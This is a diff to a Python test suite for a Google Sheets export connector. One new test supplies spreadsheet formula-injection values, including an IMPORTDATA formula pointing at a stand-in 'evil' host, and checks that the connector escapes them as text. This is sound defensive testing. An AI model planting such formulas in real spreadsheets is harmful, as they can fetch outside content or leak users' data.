@@ -90,7 +90,10 @@ def mock_token(router, expires_in=3600):
 
 
 def meta(*titles):
-    return {"properties": {"title": "Реестр"}, "sheets": [{"properties": {"title": t}} for t in titles]}
+    return {
+        "properties": {"title": "Реестр"},
+        "sheets": [{"properties": {"title": t, "sheetId": i + 1}} for i, t in enumerate(titles)],
+    }
 
 
 class Sheet:
@@ -104,6 +107,7 @@ class Sheet:
         self.appends: list[tuple[str, list]] = []
         self.puts: list[tuple[str, list]] = []
         self.created: list[str] = []
+        self.formats: list[dict] = []
         router.get(API).mock(side_effect=lambda req: httpx.Response(200, json=meta(*self.titles)))
         router.post(f"{API}:batchUpdate").mock(side_effect=self._batch)
         router.get(url__regex=rf"{API}/values/.*").mock(side_effect=self._read)
@@ -120,6 +124,9 @@ class Sheet:
 
     def _batch(self, req):
         for r in json.loads(req.content)["requests"]:
+            if "repeatCell" in r:
+                self.formats.append(r["repeatCell"])
+                continue
             title = r["addSheet"]["properties"]["title"]
             self.titles.append(title)
             self.created.append(title)
@@ -132,7 +139,8 @@ class Sheet:
         sheet = self._sheet_of(req.url.raw_path.decode())
         rows = self.cells[sheet]
         if raw.endswith("A:A"):
-            return httpx.Response(200, json={"values": [r[:1] for r in rows]} if rows else {})
+            shown = [[str(c).removeprefix("'") for c in r[:1]] for r in rows]  # Таблицы не показывают «'»
+            return httpx.Response(200, json={"values": shown} if rows else {})
         return httpx.Response(200, json={"values": rows[:1]} if rows else {})
 
     def _append(self, req):
@@ -206,7 +214,10 @@ async def test_no_access_not_retryable_names_email(http, code):
         with pytest.raises(ConnectorError) as e:
             await google_sheets.GoogleSheets().test(make_ctx(http))
     assert not e.value.retryable
-    assert e.value.message == f"нет доступа к таблице — откройте доступ на редактирование для {EMAIL}"
+    assert e.value.message == (
+        "нет доступа к таблице или выключен Google Sheets API — откройте доступ на редактирование "
+        f"для {EMAIL} и проверьте, что API включён"
+    )
 
 
 @pytest.mark.parametrize("code", [429, 500, 503])
@@ -247,8 +258,11 @@ async def test_first_export_creates_sheets_headers_and_rows(http):
     assert docs[0][:4] == ["ID документа", "Тип", "Номер", "Дата"]
     assert docs[0][-3:] == ["Статус", "Цифровая версия (PDF)", "Кабинет"]
     row = docs[1]
-    assert row[0] == "11111111-1111-1111-1111-111111111111"
-    assert row[2] == "42" and row[3] == "05.10.2026"
+    assert row[0] == "'11111111-1111-1111-1111-111111111111"  # цифры и дефисы Таблицы разобрали бы сами
+    assert row[2] == "'42"  # номер — текст, а не число
+    assert row[3] == 46300  # 05.10.2026 серийным числом
+    assert {f["range"]["startColumnIndex"] for f in sheet.formats} >= {3, 5}  # колонки с датами получили формат
+    assert all(f["cell"]["userEnteredFormat"]["numberFormat"]["pattern"] == "dd.mm.yyyy" for f in sheet.formats)
     assert 1250.5 in row and 250 in row  # числа числами
     assert None in row or "" in row  # отсутствующее поле — пусто
     items = sheet.cells[ITEMS]
@@ -329,3 +343,58 @@ def test_registered():
     c = REGISTRY["google_sheets"]
     assert {f.name for f in c.secret_fields} == {"service_account_json"}
     assert {f.name for f in c.config_fields} == {"spreadsheet_id", "documents_sheet", "items_sheet"}
+
+
+async def test_formulas_and_identifiers_sent_as_text(http):
+    evil = {
+        "supplier": '=IMPORTDATA("http://evil")',
+        "buyer": "@SUM(1)",
+        "supplier_inn": "0012345678",
+        "account": "40702810900000000001",
+        "supplier_kpp": "+7 999",
+        "bik": "-5",
+        "corr_account": "	=1+1",
+        "total": 10,
+    }
+    with respx.mock(assert_all_called=False) as router:
+        mock_token(router)
+        sheet = Sheet(router)
+        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc(**evil, items=[{"name": "=HYPERLINK(1)"}]))
+    row = dict(zip(sheet.cells[DOCS][0], sheet.cells[DOCS][1], strict=True))
+    assert row["Поставщик"] == "'=IMPORTDATA(\"http://evil\")"
+    assert row["Покупатель"] == "'@SUM(1)"
+    assert row["ИНН поставщика"] == "'0012345678"
+    assert row["Расчётный счёт поставщика"] == "'40702810900000000001"
+    assert row["КПП поставщика"] == "'+7 999" and row["БИК банка поставщика"] == "'-5"
+    assert row["Корр. счёт банка"] == "'=1+1"  # табуляция вырезана, формула экранирована
+    assert row["Всего к оплате"] == 10
+    assert sheet.cells[ITEMS][1][2] == "'=HYPERLINK(1)"
+
+
+async def test_sheet_name_is_percent_encoded_in_url(http):
+    name = "а?#/%б"
+    with respx.mock(assert_all_called=False) as router:
+        mock_token(router)
+        sheet = Sheet(router, titles=[name, "Поз"])
+        await google_sheets.GoogleSheets().export(make_ctx(http, documents_sheet=name, items_sheet="Поз"), make_doc())
+        paths = [c.request.url.raw_path.decode() for c in router.calls if "/values/" in c.request.url.path]
+    assert len(sheet.cells[name]) == 2
+    assert all("?#" not in p.split("/values/")[1] and "%3F%23%2F%25" in p for p in paths if "values/%27" in p)
+
+
+async def test_malformed_token_response(http):
+    with respx.mock(assert_all_called=False) as router:
+        router.post(TOKEN_URL).respond(200, json={"expires_in": 3600})
+        with pytest.raises(ConnectorError) as e:
+            await google_sheets.GoogleSheets().test(make_ctx(http))
+    assert "непонятный" in e.value.message
+    with respx.mock(assert_all_called=False) as router:
+        router.post(TOKEN_URL).respond(200, text="<html>")
+        with pytest.raises(ConnectorError):
+            await google_sheets.GoogleSheets().test(make_ctx(http))
+
+
+async def test_same_sheet_names_rejected(http):
+    with pytest.raises(ConnectorError) as e:
+        await google_sheets.GoogleSheets().test(make_ctx(http, documents_sheet="Лист", items_sheet="лист"))
+    assert not e.value.retryable
